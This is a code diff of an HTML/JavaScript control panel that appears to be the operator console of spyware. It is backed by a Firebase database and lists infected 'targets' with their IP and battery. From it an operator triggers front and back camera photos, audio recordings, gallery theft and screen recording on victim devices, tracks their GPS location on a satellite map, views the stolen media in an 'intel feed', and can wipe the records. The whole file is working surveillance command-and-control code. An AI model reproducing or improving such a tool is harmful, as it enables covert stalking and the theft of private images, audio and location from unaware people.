@@ -1,114 +1,182 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CMD_CENTER_PRO_V10</title>
+    <title>CORE_COMMANDER_V10_PRO</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
+        :root { --neon: #00ff41; --bg: #050505; --red: #ff3131; }
         body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
-        .sidebar { width: 300px; border-right: 1px solid #333; padding: 15px; overflow-y: auto; }
-        .target-item { border: 1px solid #222; padding: 10px; margin-bottom: 10px; cursor: pointer; }
-        .target-item.active { border-color: var(--neon); background: rgba(0,255,65,0.05); }
+        .sidebar { width: 300px; border-right: 1px solid #333; padding: 15px; overflow-y: auto; background: #0a0a0a; }
+        .target-item { border: 1px solid #222; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
+        .target-item:hover { border-color: var(--neon); background: rgba(0,255,65,0.05); }
+        .target-item.active { border-color: var(--neon); background: rgba(0,255,65,0.1); box-shadow: 0 0 10px rgba(0,255,65,0.2); }
+        
         .main { flex: 1; padding: 20px; overflow-y: auto; }
-        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; margin: 5px; cursor: pointer; font-size: 11px; }
-        .btn:hover { background: var(--neon); color: #000; }
+        .controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; padding: 15px; border: 1px solid #222; border-radius: 8px; }
+        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px 18px; cursor: pointer; font-size: 12px; font-weight: bold; border-radius: 4px; transition: 0.2s; }
+        .btn:hover { background: var(--neon); color: #000; transform: translateY(-2px); }
+        
         .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        .box { background: #111; border: 1px solid #222; padding: 15px; border-radius: 4px; }
-        #map-frame { width: 100%; height: 250px; border: 1px solid #333; background: #000; }
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
-        img, video { width: 100%; border: 1px solid #333; margin-top: 5px; }
+        .box { background: #111; border: 1px solid #222; padding: 15px; border-radius: 8px; }
+        h3 { margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 10px; font-size: 14px; letter-spacing: 1px; }
+        
+        #map-frame { width: 100%; height: 250px; border: 1px solid #333; background: #000; border-radius: 4px; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); } /* Dark Mode Map */
+        
+        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; }
+        .gallery-item { position: relative; border: 1px solid #333; border-radius: 4px; overflow: hidden; background: #000; }
+        .gallery-item img, .gallery-item video { width: 100%; display: block; }
+        .gallery-item .label { position: absolute; bottom: 0; background: rgba(0,0,0,0.7); width: 100%; font-size: 9px; padding: 2px; text-align: center; }
+        audio { width: 100%; margin-top: 5px; height: 30px; }
     </style>
 </head>
 <body>
 
 <div class="sidebar">
-    <h3>CORE_CONTROLLER</h3>
-    <div id="user-list">Fetching...</div>
+    <h2 style="color: #fff; font-size: 18px;">🛰️ CORE_CENTER</h2>
+    <div id="user-list">Fetching Active Nodes...</div>
 </div>
 
 <div class="main" id="view-panel" style="display:none;">
-    <h2 id="current-user">Select Node</h2>
+    <h2 id="current-user" style="color:#fff;">Select Node</h2>
+    
     <div class="controls">
-        <button class="btn" onclick="sendCmd('photo')">FRONT CAM</button>
-        <button class="btn" onclick="sendCmd('back_photo')">BACK CAM</button>
-        <button class="btn" onclick="sendCmd('audio')">RECORD AUDIO</button>
-        <button class="btn" onclick="sendCmd('gallery')">FETCH GALLERY</button>
-        <button class="btn" onclick="sendCmd('screen')">SCREEN REC</button>
-        <button class="btn" style="border-color:red;color:red;" onclick="deleteData()">WIPE DATA</button>
+        <button class="btn" style="border-color: #00ff41;" onclick="sendCmd('photo')">📸 TAKE FRONT PHOTO</button>
+        <button class="btn" style="border-color: #00ff41;" onclick="sendCmd('back_photo')">📸 TAKE BACK PHOTO</button>
+        <button class="btn" onclick="sendCmd('audio')">🎙️ RECORD AUDIO (5s)</button>
+        <button class="btn" onclick="sendCmd('gallery')">📂 FETCH GALLERY</button>
+        <button class="btn" onclick="sendCmd('screen')">📱 SCREEN RECORD</button>
+        <button class="btn" style="border-color:var(--red); color:var(--red);" onclick="deleteData()">💀 WIPE DATA</button>
     </div>
 
-    <div class="panel-grid" style="margin-top:20px;">
+    <div class="panel-grid">
         <div class="box">
-            <h3>LOCATION_TRACKER</h3>
-            <div id="map-frame">No Data</div>
-            <button class="btn" style="width:100%; margin-top:10px;" onclick="openExternalMap()">OPEN FULL SCREEN MAP</button>
+            <h3>📍 LOCATION_TRACKER (SATELLITE)</h3>
+            <div id="map-frame">Waiting for GPS signal...</div>
+            <button class="btn" style="width:100%; margin-top:10px; border-color: #3182ce; color: #3182ce;" onclick="openExternalMap()">🌐 OPEN FULL SCREEN MAP</button>
         </div>
+
         <div class="box">
-            <h3>SYSTEM_LOGS</h3>
-            <div id="log-content">...</div>
+            <h3>📋 SYSTEM_LOGS</h3>
+            <div id="log-content" style="line-height: 1.6; font-size: 13px;">...</div>
         </div>
+
         <div class="box" style="grid-column: span 2;">
-            <h3>INTEL_FEED</h3>
+            <h3>📥 INTEL_FEED (PHOTOS / VIDEOS / AUDIO)</h3>
             <div id="intel-feed" class="gallery"></div>
         </div>
     </div>
 </div>
 
 <script>
+    // Firebase Setup
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    
     let selectedNode = null;
     let lastCoords = null;
 
+    // Listen for Targets
     db.ref('targets').on('value', snap => {
         const container = document.getElementById('user-list');
         container.innerHTML = "";
         snap.forEach(child => {
             const id = child.key;
             const data = child.val();
-            container.innerHTML += `<div class="target-item ${selectedNode==id?'active':''}" onclick="loadNode('${id}')">
-                Node: ${id}<br><small>${data.info ? data.info.ip : '---'}</small>
-            </div>`;
+            container.innerHTML += `
+                <div class="target-item ${selectedNode==id?'active':''}" onclick="loadNode('${id}')">
+                    <strong>ID: ${id}</strong><br>
+                    <small>IP: ${data.info ? data.info.ip : 'Pending...'}</small><br>
+                    <small>BATT: ${data.info ? data.info.battery : '--'}</small>
+                </div>`;
         });
     });
 
+    // Load Specific Target Data
     function loadNode(id) {
         selectedNode = id;
         document.getElementById('view-panel').style.display = 'block';
-        document.getElementById('current-user').innerText = "NODE_ID: " + id;
+        document.getElementById('current-user').innerText = "📡 MONITORING: " + id;
 
-        // Info
+        // Sync Info & Logs
         db.ref(`targets/${id}/info`).on('value', s => {
             const d = s.val() || {};
-            document.getElementById('log-content').innerHTML = `IP: ${d.ip}<br>BATT: ${d.battery}<br>STATUS: ${d.status}<br>LAST_PING: ${d.last_seen}`;
+            document.getElementById('log-content').innerHTML = `
+                <span style="color:#aaa;">IP_ADDRESS:</span> ${d.ip || '---'}<br>
+                <span style="color:#aaa;">BATTERY:</span> ${d.battery || '---'}<br>
+                <span style="color:#aaa;">STATUS:</span> <span style="color:var(--neon)">${d.status || 'OFFLINE'}</span><br>
+                <span style="color:#aaa;">LAST_PING:</span> ${d.last_seen || '---'}
+            `;
         });
 
-        // Location
+        // Sync Location & Update Map Preview
         db.ref(`targets/${id}/location`).on('value', s => {
             lastCoords = s.val();
-            if(lastCoords) {
-                const embedUrl = `https://maps.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}&t=k&z=15&ie=UTF8&iwloc=&output=embed`;
-                document.getElementById('map-frame').innerHTML = `<iframe src="${embedUrl}" width="100%" height="100%" frameborder="0"></iframe>`;
+            if(lastCoords && lastCoords.lat) {
+                const embedUrl = `https://maps.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}&t=k&z=17&ie=UTF8&iwloc=&output=embed`;
+                document.getElementById('map-frame').innerHTML = `<iframe src="${embedUrl}"></iframe>`;
+            } else {
+                document.getElementById('map-frame').innerHTML = `<div style="padding:20px; text-align:center; color:#555;">No GPS Data Available</div>`;
             }
         });
 
-        // Combined Media Feed
+        // Sync Media Feed (Reverse order to show latest first)
         db.ref(`targets/${id}`).on('value', s => {
             const feed = document.getElementById('intel-feed');
             feed.innerHTML = "";
             const data = s.val();
-            if(data.photos) Object.values(data.photos).reverse().forEach(p => feed.innerHTML += `<img src="${p.img}">`);
-            if(data.gallery) Object.values(data.gallery).forEach(g => feed.innerHTML += `<img src="${g.data}">`);
-            if(data.audios) Object.values(data.audios).forEach(a => feed.innerHTML += `<audio src="${a.data}" controls></audio>`);
-            if(data.screens) Object.values(data.screens).forEach(sc => feed.innerHTML += `<video src="${sc.data}" controls></video>`);
+            if(!data) return;
+
+            // Render Photos (Front/Back/Gallery)
+            if(data.photos) Object.values(data.photos).reverse().forEach(p => {
+                feed.innerHTML += `<div class="gallery-item"><img src="${p.img}"><div class="label">${p.type}</div></div>`;
+            });
+
+            if(data.gallery) Object.values(data.gallery).reverse().forEach(g => {
+                feed.innerHTML += `<div class="gallery-item"><img src="${g.data}"><div class="label">GALLERY</div></div>`;
+            });
+
+            // Render Audio
+            if(data.audios) Object.values(data.audios).reverse().forEach(a => {
+                feed.innerHTML += `<div class="gallery-item" style="padding:10px;"><small>🎙️ AUDIO</small><audio src="${a.data}" controls></audio></div>`;
+            });
+
+            // Render Screen Records
+            if(data.screens) Object.values(data.screens).reverse().forEach(sc => {
+                feed.innerHTML += `<div class="gallery-item"><video src="${sc.data}" controls></video><div class="label">SCREEN_REC</div></div>`;
+            });
         });
     }
 
-    function sendCmd(act) { db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() }); }
-    function openExternalMap() { if(lastCoords) window.open(`https://www.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}`); }
-    function deleteData() { if(confirm("Clear database for this node?")) db.ref(`targets/${selectedNode}`).remove(); }
+    // --- COMMAND SYSTEM ---
+    function sendCmd(act) {
+        if(!selectedNode) return alert("❌ Pehle Target Select Karen!");
+        db.ref(`commands/${selectedNode}`).set({ 
+            action: act, 
+            ts: Date.now() 
+        });
+        console.log("Command Sent: " + act);
+    }
+
+    // Open Google Maps in New Tab
+    function openExternalMap() {
+        if(lastCoords && lastCoords.lat) {
+            window.open(`https://www.google.com/maps?q=${lastCoords.lat},${lastCoords.lng}`);
+        } else {
+            alert("No location data to open!");
+        }
+    }
+
+    // Delete User Data
+    function deleteData() {
+        if(confirm("⚠️ WARNING: Poora data delete kar dein?")) {
+            db.ref(`targets/${selectedNode}`).remove();
+            db.ref(`commands/${selectedNode}`).remove();
+            document.getElementById('view-panel').style.display = 'none';
+        }
+    }
 </script>
 </body>
 </html>
